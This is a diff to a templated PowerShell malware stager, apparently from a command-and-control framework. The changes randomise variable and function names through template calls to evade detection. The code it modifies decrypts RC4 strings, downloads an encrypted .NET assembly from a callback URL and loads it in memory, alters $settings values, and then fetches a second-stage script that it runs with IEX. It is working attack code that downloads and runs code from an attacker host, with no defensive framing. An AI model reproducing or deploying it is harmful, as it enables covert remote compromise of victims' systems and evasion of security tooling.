@@ -1,8 +1,7 @@
-$CALLBACK_URL = "{{callback_url}}"
-$WEBDAV_URL = "{{webdav_url}}"
-$KEY = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
+${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"
+${{symbol_name("KEY")}} = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
 
-function Decrypt-Code {
+function {{symbol_name("Decrypt-Code")}} {
     # RC4
     param(
         [Byte[]]$buffer,
@@ -43,27 +42,27 @@ function Decrypt-Code {
 }
 
 
-function Decrypt-String {
+function {{symbol_name("Decrypt-String")}} {
     param(
         [System.String]$string
   	)
     $result = [System.Convert]::FromBase64String($string)
-    $result = Decrypt-Code $result $KEY
+    $result = {{symbol_name("Decrypt-Code")}} $result ${{symbol_name("KEY")}}
     $result = [System.Text.Encoding]::ASCII.GetString($result)
     $result
 }
 
 {% for s in strings %}
-$string{{loop.index}} = Decrypt-String "{{s}}"
+$string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s}}"
 {% endfor %}
 
 if(-not ([System.Management.Automation.PSTypeName]"$string1").Type) {
     $K=new-object net.webclient
     $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
     $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
-    $DLL = $K.downloadstring($CALLBACK_URL+'l')
+    $DLL = $K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'l')
     $DLL = [System.Convert]::FromBase64String($DLL)
-    $DLL = Decrypt-Code $DLL $KEY
+    $DLL = {{symbol_name("Decrypt-Code")}} $DLL ${{symbol_name("KEY")}}
     $DLL = [System.Text.Encoding]::ASCII.GetString($DLL)
     [Reflection.Assembly]::Load([Convert]::FromBase64String($DLL)) | Out-Null
 }
@@ -77,6 +76,6 @@ $settings[$string5].Add($string6, "0")
 $K=new-object net.webclient
 $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
 $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
-$code = Decrypt-String ($K.downloadstring($CALLBACK_URL+'1'))
+$code = {{symbol_name("Decrypt-String")}} ($K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'1'))
 
 IEX $code
